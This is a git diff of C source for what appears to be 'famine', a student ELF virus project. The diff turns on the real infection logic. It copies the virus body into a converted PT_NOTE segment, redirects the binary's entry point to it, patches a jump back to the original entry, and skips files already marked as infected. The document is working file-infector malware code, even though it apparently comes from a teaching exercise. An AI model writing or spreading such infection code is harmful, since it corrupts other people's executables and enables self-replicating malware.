@@ -6,13 +6,13 @@
 /*   By: nguiard <marvin@42.fr>                     +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2024/10/31 10:47:01 by nguiard           #+#    #+#             */
-/*   Updated: 2024/11/07 09:51:11 by nguiard          ###   ########.fr       */
+/*   Updated: 2024/11/20 11:54:10 by nguiard          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
 #include "famine.h"
 
-static bool		parsing(byte *file, const struct stat file_stat, elf_data *data);
+static bool		parsing(byte *file, elf_data *data);
 
 //	Infects the file located at path
 //
@@ -52,7 +52,7 @@ bool	infect(profiling *this, const str path) {
 	data.fd = fd;
 
 	// Logic starts
-	if (parsing(file_origin, file_stat, &data) == false) {
+	if (parsing(file_origin, &data) == false) {
 		printf("%s is already infected or not compatible\n", path);
 		goto infect_end;
 	}
@@ -60,21 +60,18 @@ bool	infect(profiling *this, const str path) {
 	//	Change the PT_NOTE segment
 	change_note_segment(this, &data);
 
-	ft_memcpy(data.file + data.infection_offset, (byte *)"Le virus aurait ete ici", 27);
-
-	goto infect_end;
 	//	Copy the code
 	ft_memcpy(data.file + data.infection_offset, this->start_rip, this->size);
 	
 	//	Change the entrypoint
-	data.elf->e_entry = data.infection_offset;
+	data.elf->e_entry = data.infection_offset + 0x1000;
 	
 	//	Copy signature
 	ft_memcpy(data.file + data.infection_offset + this->size + SIGNATURE_OFFSET, this->signature, SIGNATURE_LEN);
 	printf("Written %s at 0x%lx\n", data.file + data.infection_offset + this->size + SIGNATURE_OFFSET,
 		data.infection_offset + this->size + SIGNATURE_OFFSET);
 
-	int	new_jump = 0 - (data.infection_offset + this->size) + data.original_entry_point + 12;
+	int	new_jump = 0 - (data.infection_offset + this->size) + data.original_entry_point + 12 - 0x1000;
 
 
 	write(ret, 1, &new_jump, 4);
@@ -94,8 +91,8 @@ bool	infect(profiling *this, const str path) {
 //
 //	Returns true if it's compatible
 //	Returns false if it's not
-static bool	parsing(byte *file, const struct stat file_stat, elf_data *data) {
-	(void)file_stat;
+static bool	parsing(byte *file, elf_data *data) {
+	Elf64_Phdr	*seg = NULL;
 
 	if (((uint32_t *)file)[0] != 0x464c457f)
 		return false;
@@ -111,6 +108,15 @@ static bool	parsing(byte *file, const struct stat file_stat, elf_data *data) {
 	data->sections = (Elf64_Shdr *)(file + data->elf->e_shoff);
 	data->segments = (Elf64_Phdr *)(file + data->elf->e_phoff);
 	data->original_entry_point = data->elf->e_entry;
+
+	for (size_t i = 0; i < data->elf->e_phnum; i++) {
+		seg = &data->segments[i];
+
+		if (seg->p_flags & PF_FAMINE) {
+			return false;
+		}
+	}
+
 
 	return true;
 }
